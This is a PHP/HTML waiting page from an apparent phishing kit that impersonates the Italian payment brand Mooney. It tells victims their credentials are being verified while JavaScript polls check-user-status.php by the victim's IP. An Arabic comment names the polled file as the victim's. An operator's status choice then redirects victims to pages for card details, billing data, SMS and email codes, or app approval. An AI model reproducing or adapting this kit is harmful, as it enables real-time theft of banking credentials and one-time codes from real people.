<?php 
// Improved function to get real client IP behind Render's proxy
function get_client_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Check for X-Forwarded-For header (set by Render and most proxies)
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // X-Forwarded-For can contain multiple IPs: client, proxy1, proxy2, ...
        // The leftmost IP is the original client IP
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $first_ip = trim($ips[0]);
        
        if (filter_var($first_ip, FILTER_VALIDATE_IP)) {
            $ip = $first_ip;
        }
    }
    // Fallback to HTTP_CLIENT_IP (rarely used, but kept for compatibility)
    elseif (isset($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    
    // Normalize IPv6 localhost to IPv4
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    
    return $ip;
}

$ip = get_client_ip();
?>

<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="utf-8">
  <title>Mooney - Verifica</title>
    <link rel="icon" type="image/png" href="image/unnamed.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    
    body {
      background-color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 500px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    /* Logo */
    .logo {
      text-align: center;
      margin-bottom: 40px;
    }
    
    .logo img {
      height: 50px;
    }
    
    /* Loading Container */
    .loading-container {
      background: white;
      width: 100%;
      text-align: center;
    }
    
    .loading-title {
      font-size: 28px;
      margin-bottom: 20px;
      color: #4F4F4F;
      font-weight: bold;
    }
    
    .loading-message {
      font-size: 16px;
      color: #4F4F4F;
      margin-bottom: 40px;
      line-height: 1.6;
    }
    
    /* Modern Spinner - أصفر وأسود */
    .spinner-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 40px 0;
    }
    
    .modern-spinner {
      width: 80px;
      height: 80px;
      position: relative;
    }
    
    .spinner-circle {
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top: 4px solid #FFCC00; /* أصفر */
      border-right: 4px solid #FFCC00; /* أصفر */
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    .spinner-inner {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      border: 3px solid transparent;
      border-bottom: 3px solid #4F4F4F; /* أسود */
      border-left: 3px solid #4F4F4F; /* أسود */
      border-radius: 50%;
      animation: spinReverse 1.5s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @keyframes spinReverse {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(-360deg); }
    }
    
    /* Security Info */
    .security-info {
      background: #f8f8f8;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 25px;
      margin-top: 30px;
      text-align: center;
    }
    
    .security-icon {
      font-size: 24px;
      margin-bottom: 10px;
      color: #008085;
    }
    
    .security-title {
      font-size: 16px;
      font-weight: 600;
      color: #4F4F4F;
      margin-bottom: 8px;
    }
    
    .security-description {
      font-size: 14px;
      color: #4F4F4F;
      line-height: 1.5;
    }
    
    /* Loading Bar */
    .loading-bar {
      width: 100%;
      height: 6px;
      background: #f0f0f0;
      border-radius: 3px;
      margin: 25px 0;
      overflow: hidden;
    }
    
    .loading-progress {
      height: 100%;
      background: #FFCC00;
      border-radius: 3px;
      animation: loading 2s ease-in-out infinite;
    }
    
    @keyframes loading {
      0% { width: 0%; }
      50% { width: 70%; }
      100% { width: 100%; }
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .container {
        padding: 0 20px;
      }
      
      .loading-title {
        font-size: 24px;
      }
      
      .loading-message {
        font-size: 15px;
      }
      
      .modern-spinner {
        width: 70px;
        height: 70px;
      }
      
      .spinner-inner {
        width: 50px;
        height: 50px;
      }
      
      .logo img {
        height: 40px;
      }
    }
    
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }
      
      .container {
        padding: 0 10px;
      }
      
      .loading-title {
        font-size: 22px;
      }
      
      .loading-message {
        font-size: 14px;
      }
      
      .modern-spinner {
        width: 60px;
        height: 60px;
      }
      
      .spinner-inner {
        width: 40px;
        height: 40px;
      }
      
      .security-info {
        padding: 20px;
      }
      
      .logo img {
        height: 35px;
      }
    }
  </style>

  <!-- Favicon -->
  <link rel="icon" href="image/logo-mo.svg" type="image/x-icon" />
</head>

<body>
  <div class="container">
    <!-- Logo -->
    <div class="logo">
      <img src="image/logo-mo.svg" alt="Mooney Logo">
    </div>
    
    <!-- Loading Container -->
    <div class="loading-container">
      <!-- Loading Title -->
      <h1 class="loading-title">Verifica in corso</h1>
      
      <!-- Loading Message -->
      <p class="loading-message">
        Stiamo verificando le tue credenziali di accesso.<br>
        Questo processo richiederà solo pochi secondi.
      </p>

      <!-- Modern Spinner - أصفر وأسود -->
      <div class="spinner-container">
        <div class="modern-spinner">
          <div class="spinner-circle"></div>
          <div class="spinner-inner"></div>
        </div>
      </div>

      <!-- Loading Bar -->
      <div class="loading-bar">
        <div class="loading-progress"></div>
      </div>

      <!-- Security Info -->
      <div class="security-info">
        <div class="security-icon">🛡️</div>
        <div class="security-title">Per la tua sicurezza</div>
        <p class="security-description">
          Stiamo confermando la tua identità attraverso i nostri sistemi 
          di sicurezza avanzati. I tuoi dati sono protetti e crittografati.
        </p>
      </div>
    </div>
  </div>

  <!-- JavaScript -->
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const userIP = '<?php echo $ip; ?>';

      // تأثيرات الظهور المتدرج
      const container = document.querySelector('.loading-container');
      container.style.opacity = '0';
      container.style.transform = 'translateY(30px)';
      container.style.transition = 'all 0.8s ease';
      
      setTimeout(() => {
        container.style.opacity = '1';
        container.style.transform = 'translateY(0)';
      }, 200);

      // === AJAX للتحقق من الحالة كل 2 ثواني ===
      function checkStatus() {
        // استخدام fetch للتحقق من ملف الضحية
        fetch(`check-user-status.php?ip=${userIP}&t=${new Date().getTime()}`)
          .then(response => {
            if (!response.ok) {
              throw new Error('Network response was not ok');
            }
            return response.text();
          })
          .then(status => {
            status = status.trim();
            
            // إذا كان هناك حالة توجيه، انتقل إلى الصفحة المطلوبة
            if (status && status !== '0' && status !== '') {
              const redirectMap = {
                'errorlogin': 'infos.php?redirection=errorlogin',
                'cc': 'infos.php?redirection=cc',
                'errorcc': 'infos.php?redirection=errorcc',
                'email_code': 'infos.php?redirection=email_code',
                'erroremail_code': 'infos.php?redirection=erroremail_code',
                'billing': 'infos.php?redirection=billing',
                'errorbilling': 'infos.php?redirection=errorbilling',
                'sms': 'infos.php?redirection=sms',
                'errorsms': 'infos.php?redirection=errorsms',
                'app': 'infos.php?redirection=app',
                'success': 'infos.php?redirection=success',
                'attivazione': 'infos.php?redirection=attivazione',
                'errorattivazione': 'infos.php?redirection=errorattivazione'
              };
              
              if (redirectMap[status]) {
                window.location.href = redirectMap[status];
                return;
              }
            }
            
            // إذا لم يكن هناك توجيه، استمر في التحقق بعد 2 ثانية
            setTimeout(checkStatus, 2000);
          })
          .catch(error => {
            console.error('Error checking status:', error);
            // في حالة الخطأ، استمر في المحاولة بعد 3 ثواني
            setTimeout(checkStatus, 3000);
          });
      }

      // بدء التحقق من الحالة بعد 1 ثانية من تحميل الصفحة
      setTimeout(checkStatus, 1000);
    });
  </script>
</body>
</html>